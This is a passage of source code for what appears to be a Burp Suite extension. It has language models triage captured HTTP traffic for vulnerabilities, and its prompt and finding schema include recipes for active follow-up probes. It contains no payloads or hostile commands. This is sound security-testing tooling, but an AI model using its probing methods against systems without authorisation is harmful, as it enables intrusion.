            "- Configuration exposure: database connection strings, internal server paths, backup paths\n"
            "- RSS/Atom feeds: XML injection opportunities, malicious entity injection\n"
            "- SVG content: if XML contains SVG, check for script tags and XSS vectors\n"
            "- XPath injection: expressions in search/filter parameters within the XML structure\n"
            "- Document type definitions that enable external resource loading\n"
            "\n"
            "TOKEN-SPECIFIC RULES:\n"
            "Only flag token issues for concrete weaknesses: 'none'/HS256-with-guessable-secret JWT, tokens in URL query parameters, tokens leaked to unauthorized users in error responses, missing expiry on long-lived privileged tokens, or predictable token generation.\n"
            "\n"
            "SEVERITY TRIAGE (be strict):\n"
            "- High: unauthenticated RCE, auth bypass, mass-IDOR, SQLi with data extraction, SSRF to internal services.\n"
            "- Medium: authenticated IDOR, reflected XSS on authenticated pages, CSRF on sensitive actions, "
            "SSRF with limited reach, exposure of individual-user PII.\n"
            "- Low: self-XSS, edge-case logic flaws requiring unlikely preconditions, minor info leaks with attack path.\n"
            "- Information: defense-in-depth hardening observations ONLY if they add value beyond a scanner.\n"
            "\n"
            "CONFIDENCE SCORING:\n"
            "- 90-100: reproducible from the captured traffic alone with high certainty.\n"
            "- 70-89: strong indicators; would be confirmed with one or two additional probes.\n"
            "- 50-69: plausible hypothesis requiring active verification; must still cite concrete artifacts.\n"
            "- Below 50: do not return the finding.\n"
            "\n"
            "Return 0-3 findings, highest risk first. Quality beats quantity.\n"
            "If more than 3 findings are present, return only the 3 highest-impact, easiest-to-verify findings so the JSON stays complete.\n"
            "Schema per finding:\n"
            "{\"title\":\"name\",\"severity\":\"High|Medium|Low|Information\","
            "\"confidence\":50-100,\"detail\":\"desc\",\"cwe\":\"CWE-X\","
            "\"owasp\":\"A0X:2021\",\"remediation\":\"fix\","
            "\"agent_status\":\"valid|needs_investigation|not_important\","
            "\"agent_priority\":\"P1|P2|P3|P4|defer\","
            "\"agent_rationale\":\"why this passive finding is worth/not worth active-agent follow-up\","
            "\"active_test_recipe\":{\"hypothesis\":\"claim to validate\","
            "\"why_now\":\"passive evidence reason\","
            "\"active_test_type\":\"authorization|authentication|injection|ssrf|xss|csrf|business_logic|token_or_session|focused_validation\","
            "\"baseline_request\":\"baseline to replay first\","
            "\"mutation_hint\":\"smallest safe mutation\","
            "\"expected_vulnerable_signal\":\"proof signal\","
            "\"expected_safe_signal\":\"safe/negative signal\","
            "\"max_requests\":3,"
            "\"needs_second_user\":false,"
            "\"safety_notes\":\"stop conditions\"},"
            "\"evidence\":[{\"type\":\"header|body|status|param\",\"location\":\"where found\","
            "\"snippet\":\"exact artifact\",\"reason\":\"why this supports the finding\"}]}\n"
            "Detail field requirements (plain text, concise but specific):\n"
            "- What was observed (endpoint/method/status/header/body evidence)\n"
            "- Why it is a security risk (attack path + impact)\n"
            "- Any preconditions/assumptions\n"
            "- Keep to 3-6 sentences and include concrete artifacts from input data when available\n"
            "Evidence requirements:\n"
            "- Include 1-3 concrete artifacts per finding when available\n"
            "- Prefer exact values/snippets over generic statements\n"
            "- Keep each evidence snippet to a single line and <= 180 characters\n"
            "Remediation requirements:\n"
            "- Actionable, technical steps specific to the issue\n"
            "- Avoid generic advice only\n"
        )

    def _default_flow_prompt(self):
        """Return the default agent bootstrap/flow prompt text for editing in settings."""
        # Use placeholder URL/token for display purposes
        return self._build_agent_bootstrap_prompt("http://127.0.0.1:8777", "your-token-here")

    def build_prompt(self, data):
        prompt = self.CUSTOM_SCAN_PROMPT if self.CUSTOM_SCAN_PROMPT else self._default_scan_prompt()

        # --- Target request ---
        prompt += "\n=== TARGET REQUEST ===\n"
        prompt += "Method: %s\n" % data.get("method", "")
        prompt += "URL: %s\n" % data.get("url", "")
        prompt += "Status: %s  Content-Type: %s  Response-Size: %s bytes\n" % (
            data.get("status", ""), data.get("content_type", ""), data.get("response_size_bytes", ""))

        path_segs = data.get("url_path_segments", [])
        if path_segs:
            prompt += "URL Path: /%s  (depth: %d)\n" % ("/".join(path_segs), data.get("url_depth", 0))

        # --- Auth ---
        auth = data.get("auth_signals", [])
        if auth:
            prompt += "\n=== AUTHENTICATION ===\n"
            for a in auth:
                prompt += "  - %s\n" % a

        # --- Tech stack ---
        tech = data.get("tech_stack", {})
        if tech and any(tech.values()):
            prompt += "\n=== TECHNOLOGY STACK ===\n"
            if tech.get("server"):
                prompt += "  Server: %s\n" % tech["server"]
            if tech.get("language"):
                prompt += "  Language: %s\n" % tech["language"]
            if tech.get("frameworks"):
                prompt += "  Frameworks: %s\n" % ", ".join(tech["frameworks"])
            if tech.get("authentication"):
                prompt += "  Auth mechanisms: %s\n" % ", ".join(tech["authentication"])
            if tech.get("features"):
                prompt += "  Features: %s\n" % ", ".join(tech["features"])

        # --- Parameters ---
        params = data.get("params_sample", [])
        if params:
            prompt += "\n=== PARAMETERS (%d total) ===\n" % data.get("params_count", len(params))
            type_map = {"0": "URL", "1": "Body", "2": "Cookie"}
            for p in params:
                ptype = type_map.get(str(p.get("type", "")), str(p.get("type", "")))
                prompt += "  [%s] %s = %s\n" % (ptype, p.get("name", ""), str(p.get("value", ""))[:200])

        # --- Request headers + body ---
        prompt += "\n=== REQUEST HEADERS ===\n"
        for h in data.get("request_headers", []):
            prompt += "  %s\n" % h
        req_body = data.get("request_body", "").strip()
        if req_body:
            prompt += "\n=== REQUEST BODY ===\n%s\n" % req_body[:2000]

        # --- Response headers + body ---
        prompt += "\n=== RESPONSE HEADERS ===\n"
        for h in data.get("response_headers", []):
            prompt += "  %s\n" % h
        res_body = data.get("response_body", "").strip()
        if res_body:
            prompt += "\n=== RESPONSE BODY ===\n%s\n" % res_body[:3000]

        # --- Neighboring requests ---
        neighbors = data.get("neighboring_requests", [])
        if neighbors:
            prompt += "\n=== NEIGHBORING REQUESTS (same host, proxy history) ===\n"
            for n in neighbors:
                prompt += "  [%s] %s %s -> HTTP %s  params=%s\n" % (
                    n.get("position", "?").upper(),
                    n.get("method", ""),
                    n.get("path", ""),
                    n.get("status", ""),
                    ",".join(n.get("params", [])) or "none"
                )

        # --- Existing findings on the same host ---
        existing = data.get("existing_findings_on_host", [])
        if existing:
            prompt += "\n=== KNOWN FINDINGS ON THIS HOST (do NOT duplicate these) ===\n"
            for f in existing:
                prompt += "  [%s] %s  (%s)\n" % (f.get("severity", ""), f.get("title", ""), f.get("url", ""))

        prompt += "\n"
        return prompt

    def _extract_json_objects_with_decoder(self, text, max_objects=10):
        if not text:
            return []

        try:
            decoder = json.JSONDecoder()
        except:
            return []

        extracted = []
        idx = 0
        text_len = len(text)

        while idx < text_len and len(extracted) < max_objects:
            start = text.find('{', idx)
            if start == -1:
                break

            chunk = text[start:]
            try:
                parsed, consumed = decoder.raw_decode(chunk)
                if isinstance(parsed, dict):
                    extracted.append(parsed)
                elif isinstance(parsed, list):
                    for item in parsed:
                        if isinstance(item, dict):
                            extracted.append(item)
                            if len(extracted) >= max_objects:
                                break
                idx = start + max(consumed, 1)
            except:
                idx = start + 1

        return extracted

    def _extract_json_arrays_with_decoder(self, text, max_arrays=5):
        if not text:
            return []

        try:
            decoder = json.JSONDecoder()
        except:
            return []

        extracted = []
        idx = 0
        text_len = len(text)

        while idx < text_len and len(extracted) < max_arrays:
            start = text.find('[', idx)
            if start == -1:
                break

            chunk = text[start:]
            try:
                parsed, consumed = decoder.raw_decode(chunk)
                if isinstance(parsed, list):
                    extracted.append(parsed)
                idx = start + max(consumed, 1)
            except:
                idx = start + 1

        return extracted

    def _extract_balanced_json_objects(self, text, max_objects=10):
        if not text:
            return []

        objects = []
        depth = 0
        start_idx = -1
        in_string = False
        escaped = False

        for i, ch in enumerate(text):
            if in_string:
                if escaped:
                    escaped = False
                    continue
                if ch == '\\':
                    escaped = True
                    continue
                if ch == '"':
                    in_string = False
                continue

            if ch == '"':
                in_string = True
                continue

            if ch == '{':
                if depth == 0:
                    start_idx = i
                depth += 1
            elif ch == '}':
                if depth > 0:
                    depth -= 1
                    if depth == 0 and start_idx != -1:
                        objects.append(text[start_idx:i + 1])
                        if len(objects) >= max_objects:
                            break
                        start_idx = -1

        return objects

    def _extract_balanced_json_arrays(self, text, max_arrays=5):
        if not text:
            return []

        arrays = []
        depth = 0
        start_idx = -1
        in_string = False
        escaped = False

        for i, ch in enumerate(text):
            if in_string:
                if escaped:
                    escaped = False
                    continue
                if ch == '\\':
                    escaped = True
                    continue
                if ch == '"':
                    in_string = False
                continue

            if ch == '"':
                in_string = True
                continue

            if ch == '[':
                if depth == 0:
                    start_idx = i
                depth += 1
            elif ch == ']':
                if depth > 0:
                    depth -= 1
                    if depth == 0 and start_idx != -1:
                        arrays.append(text[start_idx:i + 1])
                        if len(arrays) >= max_arrays:
                            break
                        start_idx = -1

        return arrays

    def _looks_like_ai_finding(self, obj):
        if not isinstance(obj, dict):
            return False
        title = str(obj.get("title", obj.get("name", "")) or "").strip()
        if not title or title == "AI Finding" or title.lower() == "untitled":
            return False
        # Nested objects such as active_test_recipe/evidence can be valid JSON
        # fragments, but they are not findings. Require the top-level finding
        # shape before accepting any recovered fragment.
        if "active_test_recipe" in obj and ("severity" in obj or "confidence" in obj):
            return True
        finding_keys = set([
            "severity", "confidence", "detail", "description", "evidence",
            "cwe", "owasp", "remediation", "agent_status", "triage_status",
            "agent_priority", "active_priority"
        ])
        for key in finding_keys:
            if key in obj:
                return True
        return False

    def _coerce_ai_findings(self, parsed):
        if parsed is None:
            return []
        candidates = []
        if isinstance(parsed, dict):
            if isinstance(parsed.get("findings"), list):
                candidates = parsed.get("findings", [])
            elif isinstance(parsed.get("results"), list):
                candidates = parsed.get("results", [])
            elif self._looks_like_ai_finding(parsed):
                candidates = [parsed]
            else:
                candidates = []
        elif isinstance(parsed, list):
            candidates = parsed
        else:
            candidates = []

        findings = []
        for item in candidates:
            if self._looks_like_ai_finding(item):
                findings.append(item)
        return findings

    def _extract_findings_from_text(self, text, max_objects=10):
        if not text:
            return []

        recovered = []
        seen = set()

        def add_findings(value):
            for item in self._coerce_ai_findings(value):
                try:
                    key = "%s|%s|%s" % (
                        str(item.get("title", "")).strip().lower(),
                        str(item.get("severity", "")).strip().lower(),
                        str(item.get("cwe", "")).strip().lower())
                except:
                    key = str(len(recovered))
                if key in seen:
                    continue
                seen.add(key)
                recovered.append(item)
                if len(recovered) >= max_objects:
                    return True
            return False

        # Prefer arrays first. A well-formed top-level array preserves complete
        # findings with nested active_test_recipe/evidence intact.
        for arr in self._extract_json_arrays_with_decoder(text, max_arrays=5):
            if add_findings(arr):
                return recovered[:max_objects]

        for arr_str in self._extract_balanced_json_arrays(text, max_arrays=5):
            try:
                cleaned = self._sanitize_ai_json_text(arr_str)
                cleaned = self._truncate_oversized_json_string_values(cleaned, max_chars=1800)
                cleaned = re.sub(r',(\s*[}\]])', r'\1', cleaned)
                if add_findings(json.loads(cleaned)):
                    return recovered[:max_objects]
            except:
                continue

        # Fall back to object extraction, but only accept objects with the
        # required finding shape. This prevents nested active_test_recipe or
        # evidence dicts from becoming generic "Untitled" findings. Continue
        # through loose title-slice recovery even after valid objects are found;
        # a truncated array can contain one valid object followed by another
        # malformed-but-recoverable finding.
        for obj in self._extract_json_objects_with_decoder(text, max_objects=max_objects * 3):
            if add_findings(obj):
                return recovered[:max_objects]

        for obj_str in self._extract_balanced_json_objects(text, max_objects=max_objects * 3):
            try:
                cleaned = self._sanitize_ai_json_text(obj_str)
                cleaned = self._truncate_oversized_json_string_values(cleaned, max_chars=1800)
                cleaned = re.sub(r',(\s*[}\]])', r'\1', cleaned)
                if add_findings(json.loads(cleaned)):
                    return recovered[:max_objects]
            except:
                continue

        for obj_str in self._extract_title_object_slices(text, max_objects=max_objects):
            parsed = self._loose_parse_finding_object(obj_str)
            if parsed and self._looks_like_ai_finding(parsed):
                if add_findings(parsed):
                    break
                if len(recovered) >= max_objects:
                    break

        return recovered[:max_objects]

    def _extract_title_object_slices(self, text, max_objects=10):
        if not text:
            return []
        try:
            matches = list(re.finditer(r'\{\s*"title"\s*:', text))
        except:
            return []
        slices = []
        for idx, match in enumerate(matches[:max_objects]):
            start = match.start()
            if idx + 1 < len(matches):
                end = matches[idx + 1].start()
            else:
                end = len(text)
                close_array = text.rfind(']')
                if close_array > start:
                    end = close_array
            chunk = text[start:end].strip()
            while chunk.endswith(",") or chunk.endswith("]"):
                chunk = chunk[:-1].strip()
            if chunk:
                slices.append(chunk)
        return slices

    def _jsonish_string_field(self, text, key, limit=2000):
        if not text:
            return ""
        pattern = r'"%s"\s*:\s*' % re.escape(key)
        try:
            match = re.search(pattern, text)
        except:
            return ""
        if not match:
            return ""
        idx = match.end()
        while idx < len(text) and text[idx].isspace():
            idx += 1
        if idx >= len(text):
            return ""
        if text[idx] == '"':
            try:
                parsed, consumed = json.JSONDecoder().raw_decode(text[idx:])
                return self._safe_ascii_text(parsed, limit).strip()
            except:
                # Fall through to a permissive scan below.
                pass
            out = []
            idx += 1
            escaped = False
            while idx < len(text) and len(out) < limit:
                ch = text[idx]
                if escaped:
                    if ch == 'n':
                        out.append('\n')
                    elif ch == 't':
                        out.append('\t')
                    else:
                        out.append(ch)
                    escaped = False
                elif ch == '\\':
                    escaped = True
                elif ch == '"':
                    break
                else:
                    out.append(ch)
                idx += 1
            return self._safe_ascii_text("".join(out), limit).strip()

        end = idx
        while end < len(text) and text[end] not in ",}\n\r":
            end += 1
        return self._safe_ascii_text(text[idx:end].strip(), limit).strip().strip('"')

    def _jsonish_int_field(self, text, key, default=50):
        value = self._jsonish_string_field(text, key, 40)
        try:
            return int(float(value))
        except:
            return int(default)

    def _jsonish_bool_field(self, text, key, default=False):
        value = self._jsonish_string_field(text, key, 40).lower()
        if value in ("true", "1", "yes", "required"):
            return True
        if value in ("false", "0", "no", "not_required"):
            return False
        return bool(default)

    def _loose_parse_finding_object(self, text):
        title = self._jsonish_string_field(text, "title", 500)
        if not title:
            return None
        severity = self._jsonish_string_field(text, "severity", 80) or "Information"
        confidence = self._jsonish_int_field(text, "confidence", 50)
        detail = self._jsonish_string_field(text, "detail", 2000)
        cwe = self._jsonish_string_field(text, "cwe", 80)
        owasp = self._jsonish_string_field(text, "owasp", 160)
        remediation = self._jsonish_string_field(text, "remediation", 1200)
        agent_status = self._jsonish_string_field(text, "agent_status", 80)
        agent_priority = self._jsonish_string_field(text, "agent_priority", 80)
        agent_rationale = self._jsonish_string_field(text, "agent_rationale", 1200)
        evidence = self._jsonish_string_field(text, "snippet", 1200)
        if not evidence:
            evidence = self._jsonish_string_field(text, "evidence", 1200)

        recipe = {
            "hypothesis": self._jsonish_string_field(text, "hypothesis", 800),
            "why_now": self._jsonish_string_field(text, "why_now", 800),
            "active_test_type": self._jsonish_string_field(text, "active_test_type", 120),
            "baseline_request": self._jsonish_string_field(text, "baseline_request", 800),
            "mutation_hint": self._jsonish_string_field(text, "mutation_hint", 1000),
            "expected_vulnerable_signal": self._jsonish_string_field(text, "expected_vulnerable_signal", 800),
            "expected_safe_signal": self._jsonish_string_field(text, "expected_safe_signal", 800),
            "max_requests": self._jsonish_int_field(text, "max_requests", 2),
            "needs_second_user": self._jsonish_bool_field(text, "needs_second_user", False),
            "safety_notes": self._jsonish_string_field(text, "safety_notes", 1000)
        }

        finding = {
            "title": title,
            "severity": severity,
            "confidence": confidence,
            "detail": detail,
            "cwe": cwe,
            "owasp": owasp,
            "remediation": remediation,
            "evidence": evidence,
            "agent_status": agent_status,
            "agent_priority": agent_priority,
            "agent_rationale": agent_rationale
        }
        if any(recipe.get(k) for k in recipe.keys()):
            finding["active_test_recipe"] = recipe
        return finding

    def _truncate_oversized_json_string_values(self, text, max_chars=1800):
        if not text:
            return text

        try:
            if max_chars < 200:
                max_chars = 200
        except:
            max_chars = 1800

        out = []
        in_string = False
        escaped = False
        current_len = 0
        truncated = False

        for ch in text:
            if in_string:
                if escaped:
                    if not truncated and current_len < max_chars:
                        out.append(ch)
                        current_len += 1
                    escaped = False
                    continue

                if ch == '\\':
                    if not truncated and current_len < max_chars:
                        out.append(ch)
                        current_len += 1
                    elif not truncated:
                        out.append("... [truncated]")
                        truncated = True
                    escaped = True
                    continue

                if ch == '"':
                    out.append(ch)
                    in_string = False
                    escaped = False
                    current_len = 0
                    truncated = False
                    continue

                if not truncated:
                    if current_len < max_chars:
                        out.append(ch)
                        current_len += 1
                    else:
                        out.append("... [truncated]")
                        truncated = True
                # If already truncated, keep consuming until closing quote.
                continue

            out.append(ch)
            if ch == '"':
                in_string = True
                escaped = False
                current_len = 0
                truncated = False

        return "".join(out)

    def _sanitize_ai_json_text(self, text):
        if not text:
            return text

        try:
            if not isinstance(text, basestring):
                try:
                    text = str(text)
                except UnicodeEncodeError:
                    text = unicode(text).encode("utf-8", "ignore")
        except:
            try:
                text = str(text)
            except:
                text = ""

        try:
            if isinstance(text, str):
                text_u = unicode(text, "utf-8", "ignore")
            else:
                text_u = text
        except:
            try:
                text_u = unicode(text)
            except:
                text_u = u""

        text_u = (text_u
                  .replace(u"\u2018", u"'")   # left single quote
                  .replace(u"\u2019", u"'")   # right single quote
                  .replace(u"\u201c", u"\"")  # left double quote
                  .replace(u"\u201d", u"\"")  # right double quote
                  .replace(u"\u00a0", u" ")  # non-breaking space
                  .replace(u"\u2010", u"-")  # hyphen
                  .replace(u"\u2011", u"-")  # non-breaking hyphen
                  .replace(u"\u2012", u"-")  # figure dash
                  .replace(u"\u2013", u"-")  # en-dash
                  .replace(u"\u2014", u"-")  # em-dash
                  .replace(u"\u2015", u"-")  # horizontal bar
                  .replace(u"\u2017", u"_")  # double underscore
                  .replace(u"\u201a", u",")  # single low-9 quotation mark
                  .replace(u"\u201b", u"'")  # single high-reversed-9 quotation mark
                  .replace(u"\u201e", u"\"")  # double low-9 quotation mark
                  .replace(u"\u201f", u"\"")  # double high-reversed-9 quotation mark
                  .replace(u"\u00ba", u"o")  # masculine ordinal indicator
                  .replace(u"\u00aa", u"a")  # feminine ordinal indicator
                  .replace(u"\u2032", u"'")  # prime
                  .replace(u"\u2033", u"\"")  # double prime
                  .replace(u"\u2039", u"<")  # single left-pointing angle quotation mark
                  .replace(u"\u203a", u">")  # single right-pointing angle quotation mark
                  )

        filtered = []
        for ch in text_u:
            o = ord(ch)
            if ch in (u"\n", u"\r", u"\t") or o >= 32:
                filtered.append(ch)
        text_u = u"".join(filtered)

        out = []
        in_string = False
        escaped = False
        for ch in text_u:
            if in_string:
                if escaped:
                    out.append(ch)
                    escaped = False
                    continue
                if ch == u"\\":
                    out.append(ch)
                    escaped = True
                    continue
                if ch == u"\"":
                    out.append(ch)
                    in_string = False
                    continue
                if ch == u"\n":
                    out.append(u"\\n")
                    continue
                if ch == u"\r":
                    out.append(u"\\r")
                    continue
                if ch == u"\t":
                    out.append(u"\\t")
                    continue
                out.append(ch)
            else:
                out.append(ch)
                if ch == u"\"":
                    in_string = True

        sanitized = u"".join(out)
        try:
            return sanitized.encode("utf-8", "ignore")
        except:
            try:
                return sanitized.encode("ascii", "ignore")
            except:
                return ""

    def _bytes_to_str(self, byte_array):
        """Convert a Java byte array (e.g. from getRequest/getResponse) to a plain string with no length limit."""
        try:
            raw = byte_array.tostring()
            if isinstance(raw, unicode):
                return raw.encode("ascii", "replace")
            return raw.decode("utf-8", "replace").encode("ascii", "replace")
        except Exception:
            try:
                return str(byte_array.tostring())
            except Exception:
                return ""

    def _safe_ascii_text(self, value, limit=500):
        text_u = u""
        try:
            if isinstance(value, unicode):
                text_u = value
            elif isinstance(value, str):
                text_u = unicode(value, "utf-8", "ignore")
            else:
                # For exception objects or other types, be extra careful
                try:
                    text_u = unicode(str(value), "utf-8", "ignore")
                except UnicodeEncodeError:
                    # If str() fails due to unicode, try repr() which escapes better
                    try:
                        text_u = unicode(repr(value), "utf-8", "ignore")
                    except:
                        text_u = u"[Error converting value]"
                except UnicodeDecodeError:
                    try:
                        text_u = unicode(repr(value), "utf-8", "ignore")
                    except:
                        text_u = u"[Error converting value]"
        except Exception:
            try:
                # Last resort: use repr and strip quotes
                text_u = unicode(repr(value), "utf-8", "ignore").strip("u'\"'")
            except:
                text_u = u"[Unprintable error]"

        text_u = (text_u
                  .replace(u"\u2018", u"'")   # left single quote
                  .replace(u"\u2019", u"'")   # right single quote
                  .replace(u"\u201c", u"\"")  # left double quote
                  .replace(u"\u201d", u"\"")  # right double quote
                  .replace(u"\u00a0", u" ")  # non-breaking space
                  .replace(u"\u2010", u"-")  # hyphen
                  .replace(u"\u2011", u"-")  # non-breaking hyphen
                  .replace(u"\u2012", u"-")  # figure dash
                  .replace(u"\u2013", u"-")  # en-dash
                  .replace(u"\u2014", u"-")  # em-dash
                  .replace(u"\u2015", u"-")  # horizontal bar
                  .replace(u"\u2017", u"_")  # double underscore
                  .replace(u"\u201a", u",")  # single low-9 quotation mark
                  .replace(u"\u201b", u"'")  # single high-reversed-9 quotation mark
                  .replace(u"\u201e", u"\"")  # double low-9 quotation mark
                  .replace(u"\u201f", u"\"")  # double high-reversed-9 quotation mark
                  .replace(u"\u00ba", u"o")  # masculine ordinal indicator
                  .replace(u"\u00aa", u"a")  # feminine ordinal indicator
                  .replace(u"\u2032", u"'")  # prime
                  .replace(u"\u2033", u"\"")  # double prime
                  .replace(u"\u2039", u"<")  # single left-pointing angle quotation mark
                  .replace(u"\u203a", u">")  # single right-pointing angle quotation mark
                  )
        return text_u.encode("ascii", "ignore")[:int(limit)]

    def _set_last_ai_error(self, message):
        try:
            self._ai_thread_state.last_error = self._safe_ascii_text(message or "", 1000)
        except:
            pass

    def _get_last_ai_error(self):
        try:
            return str(getattr(self._ai_thread_state, "last_error", "") or "")
        except:
            return ""

    def ask_ai(self, prompt):
        self._set_last_ai_error("")
        try:
            if self.AI_PROVIDER == "Ollama":
                response = self._ask_ollama(prompt)
            elif self.AI_PROVIDER == "OpenAI":
                response = self._ask_openai(prompt)
            elif self.AI_PROVIDER == "Claude":
                response = self._ask_claude(prompt)
            elif self.AI_PROVIDER == "Gemini":
                response = self._ask_gemini(prompt)
            elif self.AI_PROVIDER == "Bedrock":
                response = self._ask_bedrock(prompt)
            elif self.AI_PROVIDER == "DeepSeek":
                response = self._ask_openai(prompt)  # DeepSeek uses OpenAI-compatible API
            else:
                self.stderr.println("[!] Unknown AI provider: %s" % self.AI_PROVIDER)
                return None
            
            # Sanitize response to handle unicode characters
            if response:
                response = self._sanitize_ai_json_text(response)
            else:
                self._set_last_ai_error("AI provider returned an empty response body")
            return response
            
        except Exception as e:
            try:
                e_str = str(e)
            except:
                try:
                    e_str = unicode(e).encode("ascii", "ignore")
                except:
                    e_str = "Error"
            self._set_last_ai_error(e_str)
            self.stderr.println("[!] AI request failed: %s" % self._safe_ascii_text(e_str))
            return None
    
    def _ask_ollama(self, prompt):
        """Send request to Ollama with timeout and retry logic"""
        generate_url = self.API_URL.rstrip('/') + "/api/generate"
        
        payload = {
            "model": self.MODEL,
            "prompt": prompt,
            "stream": False,
            "format": "json",
            "options": {
                "temperature": 0.0,
                "num_predict": self.MAX_TOKENS
            }
        }
        
        max_retries = 2
        retry_count = 0
        
        while retry_count <= max_retries:
            try:
                if self.VERBOSE and retry_count > 0:
                    self.stdout.println("[DEBUG] Retry attempt %d/%d..." % (retry_count, max_retries))
                
                req = urllib2.Request(generate_url, data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
                                    headers={"Content-Type": "application/json"})
                
                # Use configurable timeout
                resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
                
                raw = resp.read().decode("utf-8", "ignore")
                response_json = json.loads(raw)
                ai_response = response_json.get("response", "").strip()
                
                # Sanitize response to handle unicode characters
                ai_response = self._sanitize_ai_json_text(ai_response)

                prompt_tokens = response_json.get("prompt_eval_count")
                completion_tokens = response_json.get("eval_count")
                if prompt_tokens is None:
                    prompt_tokens = self._estimate_token_count(prompt)
                if completion_tokens is None:
                    completion_tokens = self._estimate_token_count(ai_response)
                self._record_token_usage(prompt_tokens, completion_tokens)
                
                if response_json.get("done_reason") == "length":
                    ai_response = self._fix_truncated_json(ai_response)
                
                return ai_response
                
            except urllib2.URLError as e:
                try:
                    e_str = str(e)
                except:
                    try:
                        e_str = unicode(e).encode("ascii", "ignore")
                    except:
                        e_str = "URLError"
                if "timed out" in e_str or "timeout" in e_str.lower():
                    retry_count += 1
                    if retry_count <= max_retries:
                        self.stderr.println("[!] Request timeout, retrying... (%d/%d)" % (retry_count, max_retries))
                        time.sleep(2)  # Wait 2 seconds before retry
                    else:
                        self.stderr.println("[!] Request failed after %d retries (timeout: %ds)" % 
                                          (max_retries, int(self.AI_REQUEST_TIMEOUT)))
                        self.stderr.println("[!] Try increasing timeout in Settings or using a faster model")
                        raise
                else:
                    # Non-timeout error, don't retry
                    raise
            except Exception as e:
                # Other errors, don't retry
                raise
        
        return None
    
    def _ask_openai(self, prompt):
        """Send request to OpenAI with configurable timeout"""
        def _safe_text(value):
            if value is None:
                return ""
            try:
                return str(value).strip()
            except:
                return ""

        def _get_openai_context_window():
            model_l = str(self.MODEL or "").lower()
            if "gpt-4o" in model_l or "gpt-4.1" in model_l:
                return 128000
            if model_l.startswith("gpt-4"):
                return 8192
            if "gpt-3.5" in model_l:
                return 16385
            return 32768

        def _truncate_prompt_for_budget(text, token_budget):
            char_budget = max(1200, int(token_budget) * 4)
            if len(text) <= char_budget:
                return text

            marker = "\nData:\n"
            marker_idx = text.find(marker)
            if marker_idx != -1:
                prefix = text[:marker_idx + len(marker)]
                data_part = text[marker_idx + len(marker):]
                keep_chars = max(300, char_budget - len(prefix) - 32)
                return prefix + data_part[:keep_chars] + "\n...[truncated]"

            return text[:char_budget] + "\n...[truncated]"

        def _openai_request(payload, endpoint_path="/chat/completions"):
            req = urllib2.Request(
                self.API_URL.rstrip('/') + endpoint_path,
                data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + self.API_KEY
                }
            )
            resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
            return json.loads(resp.read())

        context_window = _get_openai_context_window()
        reserved_completion = min(max(int(self.MAX_TOKENS or 0), 256), 4096)
        prompt_token_budget = max(1200, context_window - reserved_completion - 800)
        est_prompt_tokens = self._estimate_token_count(prompt)
        if est_prompt_tokens > prompt_token_budget:
            original_est = est_prompt_tokens
            prompt = _truncate_prompt_for_budget(prompt, prompt_token_budget)
            self.stderr.println("[!] OpenAI prompt too large for %s (%d est tokens > %d budget). Truncating request context." %
                                (str(self.MODEL), int(original_est), int(prompt_token_budget)))

        request_payload = {
            "model": self.MODEL,
            "messages": [{"role": "user", "content": prompt}],
            "max_completion_tokens": self.MAX_TOKENS,
            "temperature": 0.0
        }
        endpoint_path = "/chat/completions"

        try:
            data = _openai_request(request_payload, endpoint_path)
        except urllib2.HTTPError as e:
            error_body = ""
            msg = ""
            err_type = ""
            code = ""
            try:
                error_body = e.read()
                if isinstance(error_body, bytes):
                    error_body = error_body.decode("utf-8", "ignore")
            except:
                error_body = ""

            error_message = "HTTPError"
            try:
                error_message = str(e)
            except:
                try:
                    error_message = unicode(e).encode("ascii", "ignore")
                except:
                    pass
            if error_body:
                try:
                    parsed = json.loads(error_body)
                    api_error = parsed.get("error", {})
                    msg = _safe_text(api_error.get("message", ""))
                    err_type = _safe_text(api_error.get("type", ""))
                    code = _safe_text(api_error.get("code", ""))
                    details = []
                    if msg:
                        details.append(msg)
                    if err_type:
                        details.append("type=%s" % err_type)
                    if code:
                        details.append("code=%s" % code)
                    if len(details) > 0:
                        error_message = "OpenAI HTTP %d - %s" % (e.code, " | ".join(details))
                except:
                    error_message = "OpenAI HTTP %d - %s" % (e.code, error_body[:300])

            msg_l = msg.lower()
            if (e.code == 400 and
                "unsupported parameter" in msg_l and
                "max_completion_tokens" in msg_l and
                "max_tokens" in msg_l):
                self.stderr.println("[!] %s" % self._safe_ascii_text(error_message))
                self.stderr.println("[!] Retrying OpenAI request with max_tokens fallback...")
                fallback_payload = {
                    "model": self.MODEL,
                    "messages": [{"role": "user", "content": prompt}],
                    "max_tokens": self.MAX_TOKENS,
                    "temperature": 0.0
                }
                data = _openai_request(fallback_payload, endpoint_path)
            elif (
                e.code == 400 and
                (
                    "maximum context length" in msg_l or
                    "context length" in msg_l or
                    "too many tokens" in msg_l
                )
            ):
                self.stderr.println("[!] %s" % self._safe_ascii_text(error_message))
                tighter_budget = max(800, int(prompt_token_budget * 0.6))
                reduced_prompt = _truncate_prompt_for_budget(prompt, tighter_budget)
                if reduced_prompt == prompt:
                    self.stderr.println("[!] Unable to further reduce prompt size automatically.")
                    raise
                self.stderr.println("[!] Retrying OpenAI request with reduced context payload...")
                prompt = reduced_prompt
                retry_payload = {
                    "model": self.MODEL,
                    "messages": [{"role": "user", "content": prompt}],
                    "max_completion_tokens": self.MAX_TOKENS,
                    "temperature": 0.0
                }
                data = _openai_request(retry_payload, endpoint_path)
            elif (
                ("not a chat model" in msg_l and "v1/chat/completions" in msg_l) or
                ("did you mean to use v1/completions" in msg_l)
            ):
                self.stderr.println("[!] %s" % self._safe_ascii_text(error_message))
                self.stderr.println("[!] Retrying OpenAI request with /completions endpoint for non-chat model...")
                fallback_payload = {
                    "model": self.MODEL,
                    "prompt": prompt,
                    "max_tokens": self.MAX_TOKENS,
                    "temperature": 0.0
                }
                endpoint_path = "/completions"
                data = _openai_request(fallback_payload, endpoint_path)
            else:
                self.stderr.println("[!] %s" % self._safe_ascii_text(error_message))
                if e.code == 400:
                    self.stderr.println("[!] Tip: check model name and API compatibility in Settings")
                raise

        ai_response = ""
        try:
            choices = data.get("choices", [])
            if len(choices) > 0:
                if endpoint_path == "/completions":
                    ai_response = choices[0].get("text", "")
                else:
                    msg_obj = choices[0].get("message", {})
                    if isinstance(msg_obj, dict):
                        ai_response = msg_obj.get("content", "")
